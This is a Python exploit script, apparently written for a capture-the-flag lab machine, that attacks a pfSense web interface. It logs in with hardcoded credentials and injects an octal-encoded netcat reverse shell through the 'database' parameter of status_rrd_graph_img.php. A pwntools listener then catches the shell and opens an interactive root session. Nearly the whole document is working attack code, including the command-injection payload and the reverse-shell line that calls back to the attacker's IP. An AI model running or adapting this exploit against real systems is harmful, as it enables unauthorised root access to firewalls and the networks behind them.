#!/usr/bin/python3
#coding: utf-8

import requests
import re
import urllib3
import sys
import signal
import threading
from time import sleep
from pwn import *


def exiting(sig, frame):
	log.failure("Exiting... (You pressed Ctrl+c)")
	sys.exit(0)

def get_octal_reverse_shell(reverse_shell):
	octal_command = ""
	octal_command += 'printf%20%22'
	for char in reverse_shell:
		octal_command += "\\" + oct(ord(char)).lstrip("0o")
	octal_command += '%22|sh'
	return octal_command


def request_reverse_shell():

	session = None

	try:
		var_info = log.progress("Attacking the WebSite")
		sleep(2)
		var_info.status("Estabeleshing session")
		urllib3.disable_warnings()
		session = requests.session()
		session.verify = False
		session.keep_alive = False

		request = session.get(target_base_url + login_page)
		csrf_magic = re.findall("__csrf_magic' value=\"(.*?);", request.text)[0].replace(";", "").replace("__csrf_magic' value=\"", "")

		data = {
			"__csrf_magic": csrf_magic,
			"usernamefld": "rohit",
			"passwordfld": "pfsense",
			"login": "Login"
		}

		sleep(2)
		var_info.status("Trying to Login")
		request = session.post(target_base_url + login_page, data=data)
		sleep(2)
		var_info.status("Sending ReverseShell")
		request = session.get(full_url_payload)
		sleep(2)
		var_info.success("Payload is 'a caminho!!!'")
		sleep(2)
		log.success("Privilege escalation... LOL xD That shitty site is running as root xD...")
		sleep(2)

	except:
		log.critical("Fatal error when executing 'request_reverse_shell()'")
		sys.exit(1)


# Variáveis Globais
local_ip = "10.10.14.11"
local_port = 443
target_base_url = "https://10.10.10.60/"
login_page = "index.php"
exploit_filename = "status_rrd_graph_img.php?database=queues;"
reverse_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f"
octal_reverse_shell = get_octal_reverse_shell(reverse_shell)

full_url_payload = target_base_url + exploit_filename + octal_reverse_shell


def main():
	signal.signal(signal.SIGINT, exiting)
	try:
		threading.Thread(target=request_reverse_shell).start()
	except Exception as e:
		log.critical(str(e))
	
	shell = listen(local_port, timeout=20).wait_for_connection()
	if shell.sock is None:
		log.critical("Algo de errado não deu certo...")
		sys.exit(1)
	else:
		log.success("Reverse Shell estabelecido com sucesso")
		sleep(2)
		log.success("Acesso ao sistema com o usuário Root")
		shell.interactive()

main()